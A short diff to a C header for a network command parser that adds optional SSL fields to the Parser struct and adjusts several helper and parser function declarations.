@@ -19,6 +19,10 @@
 #include "common.h"
 #include "config.h"
 
+#ifndef TICK_FEATURES_NO_CRYPTO
+#include "ssl.h"
+#endif
+
 // Base command IDs per category.
 #define BASE_CMD_SYSTEM         0x0000
 #define BASE_CMD_FILE           0x0100
@@ -84,14 +88,17 @@ typedef struct
     char hostname[64];
     int port;
     int fd;
+#ifndef TICK_FEATURES_NO_CRYPTO
+    int use_ssl;
+    SSL_Context ssl;
+#endif
     CMD_HEADER header;
     char *buffer[TICK_PARSER_BUFFER_SIZE];
 } Parser;
 
 // Helper functions.
-int is_empty(const unsigned char *buffer, size_t size);
 void uuid4(unsigned char *uuid);
-int copy_stream(int source, int destination, ssize_t count);
+int is_empty(const char *buffer, size_t size);
 
 // Parser methods.
 void parser_init(Parser *parser, const Settings *settings);
@@ -103,8 +110,7 @@ int parser_is_connected(Parser *parser);
 void parser_connect(Parser *parser);
 void parser_wait(Parser *parser);
 void parser_next(Parser *parser);
-ssize_t parser_get_first_arg(Parser *parser);
-ssize_t parser_get_second_arg(Parser *parser);
-ssize_t parser_read_first_arg(Parser *parser, char *buffer, size_t count);
+int parser_get_first_arg(Parser *parser);
+int parser_read_first_arg(Parser *parser, char *buffer, size_t count);
 
 #endif /* PARSER_H */
